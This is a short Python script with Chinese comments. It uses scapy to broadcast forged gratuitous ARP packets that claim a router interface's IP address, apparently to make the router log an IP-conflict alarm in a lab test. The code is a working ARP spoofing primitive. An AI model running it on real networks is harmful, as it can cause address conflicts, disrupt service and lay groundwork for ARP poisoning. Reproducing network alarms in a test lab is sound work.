'''
使用Python铸造ARP(Gratuitous ARP)的数据包,让路由器产生同样的日志告警
'''

# 导入 scapy 库：专门用于构造和发送网络数据包
# ARP：构造ARP协议包
# Ether：构造以太网二层帧
# sendp：发送二层数据包（基于网卡）
from scapy.all import ARP, Ether, sendp
import time

def send_gratuitous_arp(conflict_ip, interface, count=5, interval=1):
    """
    【核心函数】发送免费ARP(Gratuitous ARP)包，制造IP地址冲突
    原理：
        免费ARP是一种特殊的ARP请求包，特点是：
        1. 源IP地址 = 目标IP地址（都是要冲突的IP）
        2. 目标MAC地址 = 广播地址 ff:ff:ff:ff:ff:ff
        3. 同一广播域内所有设备都会收到这个包
        4. 路由器收到后会检测到"有其他设备也在使用这个IP"，从而产生告警

    参数说明：
        conflict_ip: 要制造冲突的IP地址（必须和路由器接口IP完全相同）
        interface:  发送数据包的本地Linux网卡名（如 eth0、ens33）
        count:      发送数据包的数量（默认5个，确保路由器能收到）
        interval:   两个数据包之间的间隔时间（秒，默认1秒）
    """
    print(f"[*] 开始执行IP冲突攻击测试")
    print(f"[*] 目标冲突IP: {conflict_ip}")
    print(f"[*] 发送网卡: {interface}")
    print(f"[*] 发送数量: {count} 个，间隔 {interval} 秒\n")

    # ======================
    # 1. 构造ARP协议层数据包
    # ======================
    arp_packet = ARP(
        # op=1 表示这是一个ARP请求包（op=2是ARP应答包）
        # 免费ARP用请求包和应答包都可以，请求包更通用
        op=1,
        
        # 源IP地址：填要冲突的IP（假装我们是这个IP的拥有者）
        psrc=conflict_ip,
        
        # 目标IP地址：和源IP相同（这是免费ARP的核心特征）
        pdst=conflict_ip,
        
        # 目标MAC地址：广播地址，让同一网段所有设备都收到
        hwdst="ff:ff:ff:ff:ff:ff"
    )

    # ======================
    # 2. 封装成以太网二层帧
    # ======================
    # 以太网帧的目标MAC也设为广播地址
    ether_frame = Ether(dst="ff:ff:ff:ff:ff:ff")
    
    # 把ARP包封装到以太网帧里（用 / 表示分层封装）
    full_packet = ether_frame / arp_packet

    # ======================
    # 3. 循环发送数据包
    # ======================
    for i in range(count):
        # sendp：发送二层数据包（需要指定网卡）
        # verbose=False：不打印scapy的冗余输出
        sendp(full_packet, iface=interface, verbose=False)
        print(f"[+] 已发送第 {i+1} 个免费ARP包")
        time.sleep(interval)

    print("\n[✓] 所有数据包发送完成！")
    print("[✓] 请查看路由器Console，应该已经出现IP冲突告警")

if __name__ == '__main__':
    # ======================
    # 【重要】修改为你自己的参数！
    # ======================
    # 1. 改成你路由器接口的IP地址（和你截图里的10.1.1.1一致）
    TARGET_IP = "10.10.1.200"
    
    # 2. 改成你Linux机器的网卡名
    #    查看方法：在Linux终端执行 ip a 命令
    #    通常是 eth0、ens33、ens160 等
    LOCAL_INTERFACE = "ens160"

    # 调用函数执行
    send_gratuitous_arp(
        conflict_ip=TARGET_IP,
        interface=LOCAL_INTERFACE,
        count=5,
        interval=1
    )